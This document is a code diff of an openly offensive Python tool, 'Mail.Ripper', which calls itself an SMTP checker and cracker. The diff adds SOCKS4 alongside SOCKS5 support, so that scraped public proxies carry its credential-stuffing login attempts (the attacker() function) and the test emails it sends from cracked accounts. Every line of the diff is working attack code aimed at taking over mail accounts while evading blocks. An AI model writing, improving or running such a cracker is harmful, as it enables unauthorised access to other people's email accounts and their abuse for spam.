@@ -2,7 +2,7 @@
 #encoding: utf-8
 #name: Mail.Ripper v1 (proxy version)
 #description: smtp checker / smtp cracker including mailsending check for hits and SOCKS5 support
-#version: 1.05, 2020-11-21
+#version: 1.07, 2020-11-27
 #author: DrPython3
 #----------------------------------------------------------------------------------------------------------------------
 #((--> *P*A*C*K*A*G*E*S***N*E*E*D*E*D* <--))
@@ -42,13 +42,14 @@ logo2 = '''
 #----------------------------------------------------------------------------------------------------------------------
 #((--> *V*A*R*I*A*B*L*E*S***E*T*C* <--))
 
-combofile = 'none.txt'
+combofile = str('none.txt')
 combos = []
 socksprox = []
 tout = float(123.0)
 skip = int(1)
 usesocks = int(0)
 sockscount = int(0)
+sockstype = int(5)
 attackthreats = int(999)
 valid = int(0)
 bad = int(0)
@@ -129,9 +130,12 @@ def blackcheck(search):
 
 #getproxdata == scrapes SOCKS4 proxies from Proxyscrape.com:
 def getproxdata():
-    print(Fore.LIGHTYELLOW_EX + '### PLEASE WAIT! ###\n\nScraping SOCKS5 proxies - this may take a while ...\n')
-    #Scraping source:
-    psource = 'https://api.proxyscrape.com?request=displayproxies&proxytype=socks5&timeout=2000'
+    if sockstype == int(5):
+        print(Fore.LIGHTYELLOW_EX + '### PLEASE WAIT! ###\n\nScraping SOCKS5 proxies - this may take a while ...\n')
+        psource = 'https://api.proxyscrape.com?request=displayproxies&proxytype=socks5&timeout=1000'
+    else:
+        print(Fore.LIGHTYELLOW_EX + '### PLEASE WAIT! ###\n\nScraping SOCKS4 proxies - this may take a while ...\n')
+        psource = 'https://api.proxyscrape.com?request=displayproxies&proxytype=socks4&timeout=1000'
     http = urllib3.PoolManager(ca_certs=certifi.where())
     proxydata = http.request('GET', psource)
     with open('proxydata.txt', 'a') as proxyfile:
@@ -163,7 +167,10 @@ def finder(unkdom):
         rawproxy = str(randomprox())
         fproxy = str(rawproxy.split(":")[0])
         fproxyport = int(rawproxy.split(":")[1])
-        socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, fproxy, fproxyport)
+        if sockstype == int(4):
+            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, fproxy, fproxyport)
+        else:
+            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, fproxy, fproxyport)
         socks.wrapmodule(smtplib)
     else: pass
     z = str('failed')
@@ -205,13 +212,17 @@ def attacker(attackhost, attackport, attackuser, attackpass):
         rawproxy = str(randomprox())
         fproxy = str(rawproxy.split(":")[0])
         fproxyport = int(rawproxy.split(":")[1])
-        socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, fproxy, fproxyport)
+        if sockstype == int(4):
+            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, fproxy, fproxyport)
+        else:
+            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, fproxy, fproxyport)
         socks.wrapmodule(smtplib)
     else: pass
     try:
         #if SMTP port is unknown, try to find it using most common ones:
         if attackport == 0:
-            print(Fore.LIGHTYELLOW_EX + 'Unknown port for HOST ' + str(attackhost) + ', testing connection with most common ports ...\n')
+            print(Fore.LIGHTYELLOW_EX + 'Unknown port for HOST ' + str(attackhost)
+                  + ', testing connection with most common ports ...\n')
             for x in subp:
                 p = int(x)
                 try:
@@ -280,7 +291,10 @@ def sendcheckmsg(mailhost, mailport, mailuser, mailpass, proxy, proxyport):
         socket.setdefaulttimeout(tout)
         msgcontext = ssl.create_default_context()
         if usesocks == 1:
-            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, str(proxy), int(proxyport))
+            if sockstype == int(4):
+                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, str(proxy), int(proxyport))
+            else:
+                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, str(proxy), int(proxyport))
             socks.wrapmodule(smtplib)
         else: pass
         #generate randomID:
@@ -540,6 +554,17 @@ if usesocks == 1:
     print(Fore.LIGHTRED_EX + Style.BRIGHT + '\nWARNING: SOCKS-proxies activated! Bad combos may be false negatives! ...\n')
 else:
     print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nSOCKS-proxies not acticated ...')
+if usesocks == 1:
+    try:
+        sockstype = int(input(Fore.LIGHTWHITE_EX + 'Which kind of SOCKS do you want to use (4 = SOCKS4, 5 = SOCKS5) :    '))
+        if sockstype == int(4):
+            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nWill scrape and use SOCKS4 proxies ...\n')
+        else:
+            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nWill scrape and use SOCKS5 proxies ...\n')
+    except:
+        sockstype = int(5)
+        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nWill scrape and use SOCKS5 proxies ...\n')
+else: pass
 
 #ask to start checking:
 startnow = input(Fore.LIGHTWHITE_EX + '*** DO YOU WANT TO START THE CHECKER NOW? *** (yes / no) :     ')
@@ -559,11 +584,14 @@ if usesocks == 1:
         getproxdata()
         socksprox = open('proxydata.txt', 'r').read().splitlines()
         sockscount = int(len(socksprox))
-        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '... scraped ' + str(sockscount) + ' SOCKS4 proxies!\n')
         if sockscount == 0:
             print(Fore.LIGHTYELLOW_EX + 'No proxies scraped! SOCKS-support is deactivated ...\n')
             usesocks = int(0)
-        else: pass
+        else:
+            if sockstype == int(4):
+                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '... scraped ' + str(sockscount) + ' SOCKS4 proxies!\n')
+            elif sockstype == int(5):
+                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '... scraped ' + str(sockscount) + ' SOCKS5 proxies!\n')
     except:
         print(Fore.LIGHTRED_EX + Style.BRIGHT + 'An error occurred! SOCKS-support is deactivated ...\n')
         usesocks = int(0)
